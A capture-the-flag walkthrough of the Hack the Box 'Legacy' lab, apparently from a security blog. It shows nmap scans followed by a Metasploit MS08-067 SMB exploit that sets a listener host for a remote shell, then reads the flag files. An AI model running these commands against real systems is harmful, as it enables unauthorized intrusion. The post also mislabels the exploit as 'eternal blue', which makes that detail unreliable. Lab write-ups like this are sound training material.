<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Legacy Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-legacy-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-03-25T17:59:59+00:00">March 25, 2018</time><time class="updated" datetime="2025-07-07T08:42:14+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Legacy</strong>” which is lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Legacy lab.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Beginners</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file in the victim’s machine.</span></p>
<h5><span style="color: #000000;">Let’s begin the Game!!</span></h5>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of Legacy is <strong>10.10.10.4</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.4</pre>
<p><span style="color: #000000;">From the given below image, you can observe that we found open port 139 and 445 denotes that it is a windows machine.</span></p>
<p><span style="color: #000000;">When I extract the complete result of nmap I found the following details</span></p>
<p><span style="color: #000000;">OS: <strong>Windows XP</strong></span></p>
<p><span style="color: #000000;">Computer name: <strong>Legacy</strong></span></p>
<p><span style="color: #000000;">NetBIOS computer name <strong>Legacy</strong></span></p>
<p><span style="color: #000000;">As we know in Windows XP Port 445 was vulnerable to netapi exploit and it was a remarkable vulnerability in SMB protocol.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-yltikUljzYY/Wrk1NXoEJvI/AAAAAAAAVuQ/ielLTAED4yMsF0CaAz8syCIXw_LVfoCigCLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">Let confirm SMB vulnerability in victims system using nmap script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap --script vuln -p445 10.10.10.4</pre>
<p><span style="color: #000000;"><strong>Awesome!!</strong> Victim’s machine is vulnerable to <strong>MS08-67</strong>exploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FVneqvHGDpk/Wrk1NBthvdI/AAAAAAAAVuM/7K2X4l0KuiQ3lAwyePHLBrCDA8hI43c3ACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then I run <strong>msfconsole</strong> command in terminal and load metasploit framework for using eternal blue module for exploiting target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) &gt;set rhost 10.10.10.4
msf exploit(windows/smb/ms08_067_netapi) &gt;set rport 445
msf exploit(windows/smb/ms08_067_netapi) &gt;set lhost 10.10.14.3
msf exploit(windows/smb/ms08_067_netapi) &gt;exploit</pre>
<p><span style="color: #000000;"><strong>Awesome!!</strong> I have got unauthorized access of victims command shell through <strong>session 1</strong> as shown in below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DWcvXeHDY_k/Wrk1NaVh_nI/AAAAAAAAVuU/FCapOx1v3xE2FlNi7s83poqYpfiagcUFgCLcBGAs/s1600/3.1.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>C:\Document and Setting \john\Desktop</strong> I found the<strong> user.txt</strong> file and used cat “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user.txt</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We got our 1<sup>st</sup> flag successfully</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gfk4pStg76s/Wrk1N0hCpxI/AAAAAAAAVuY/g98Ucl-T6Ogpq1Di4eF-Kae_OVmqIX5zACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>C:\Document and Settings\Administrator\Desktop</strong> I found the<strong> root.txt</strong> file and used cat “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root.txt</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We got our 2nd flag successfully</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pA5NTO6SuT4/Wrk1OQ5pDDI/AAAAAAAAVuc/Z5pppR4AOhUjGq_z9aa8TaNnDWhkXj7EACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
